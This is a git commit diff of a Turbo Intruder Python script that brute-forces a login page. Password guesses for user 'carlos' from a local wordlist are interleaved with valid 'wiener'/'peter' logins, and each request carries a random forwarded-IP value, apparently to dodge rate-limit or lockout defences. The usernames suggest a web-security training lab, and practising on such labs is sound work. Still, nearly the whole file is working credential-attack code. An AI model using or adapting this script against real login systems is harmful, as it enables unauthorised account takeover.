dacb6c08c49da19f7d6c4f088961c04b19eec674
pip3lee101 <pip3lee101@gmail.com>
2022-11-06 03:58:16 +0000

    update

--- turbo++/login/counter.py
+++ turbo++/login/counter.py
@@ -2,22 +2,23 @@ from random import randint
 
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=5,
-                           requestsPerConnection=100,
+                           concurrentConnections=1,
+                           requestsPerConnection=5,
                            pipeline=False
                            )
+    
     l = []
     for t in open('/home/kali/Desktop/pass.txt'):
             l.append(t)
-    for m in range(1,201):
+    for m in range(0,201):
        if m % 2 == 0:
             XFOR = randint(500,10500)
             engine.queue(target.req, [ XFOR, "wiener", "peter"])
        elif m % 2 != 0:
+            n = len(l) -1
             XFOR = randint(500,10500)
-            i = randint(0,99)
-            engine.queue(target.req, [ XFOR, "carlos", l[i] ])
-
+            engine.queue(target.req, [ XFOR, "carlos", l[n] ])
+            l.pop(n)
 def handleResponse(req, interesting):
     # currently available attributes are req.status, req.wordcount, req.length and req.response
     if req.status != 404:
